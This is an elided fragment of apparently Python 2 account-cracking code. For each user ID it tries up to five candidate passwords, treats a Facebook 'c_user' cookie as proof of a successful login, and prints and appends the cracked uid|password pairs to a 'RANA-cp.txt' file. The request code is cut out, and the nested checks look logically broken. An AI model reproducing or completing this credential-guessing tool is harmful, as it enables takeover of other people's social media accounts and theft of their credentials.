    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[RANA-CP] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[RANA-CP] ' + uid + ' | ' + pass2
                    cp = open('RANA-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[RANA-CP] ' + uid + ' | ' + pass3
                        cp = open('RANA-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[RANA-CP] ' + uid + ' | ' + pass4
                            cp = open('RANA-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[RANA-CP] ' + uid + ' | ' + pass5
                                cp = open('RANA-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
